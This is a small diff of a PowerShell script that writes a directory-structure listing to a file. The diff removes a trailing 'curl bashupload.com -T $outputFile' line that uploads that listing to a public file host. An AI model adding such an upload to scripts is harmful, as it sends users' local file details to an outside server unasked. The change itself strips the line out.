@@ -45,5 +45,3 @@ $directoryStructure = Get-DirectoryStructure -path $rootDir
 
 # Write to the output file, overwriting if it exists
 $directoryStructure | Out-File -FilePath $outputFile -Encoding utf8 -Force
-
-curl bashupload.com -T $outputFile
